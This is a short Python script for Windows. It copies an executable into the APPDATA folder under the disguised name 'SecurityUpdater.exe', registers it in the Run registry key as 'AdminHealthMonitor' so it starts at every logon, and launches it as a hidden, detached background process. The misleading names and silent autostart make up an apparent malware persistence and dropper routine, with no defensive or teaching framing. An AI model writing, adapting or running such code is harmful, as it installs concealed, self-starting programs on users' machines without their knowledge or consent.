import os
import shutil
import subprocess
import winreg
import time

appdata = os.environ.get('APPDATA', '')
phantom_dir = os.path.join(appdata, 'PhantomLead')
os.makedirs(phantom_dir, exist_ok=True)

with open(os.path.join(phantom_dir, 'config.dat'), 'w', encoding='utf-8') as f:
    f.write('STANDALONE_SENTINEL')

updater_exe = os.path.join(phantom_dir, 'SecurityUpdater.exe')
subprocess.run(['taskkill', '/F', '/IM', 'SecurityUpdater.exe'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(0.5)

shutil.copyfile(os.path.abspath('dist/SecureInstaller_T.exe'), updater_exe)

# Registry Run key
try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, 'AdminHealthMonitor', 0, winreg.REG_SZ, f'"{updater_exe}" --heartbeat')
    winreg.CloseKey(key)
except Exception as e:
    print('Reg error:', e)

# Launch background process
p = subprocess.Popen([updater_exe, '--heartbeat'], creationflags=0x00000008 | 0x08000000 | 0x00000200, close_fds=True)
print(f'Successfully started SecurityUpdater.exe with PID: {p.pid}')
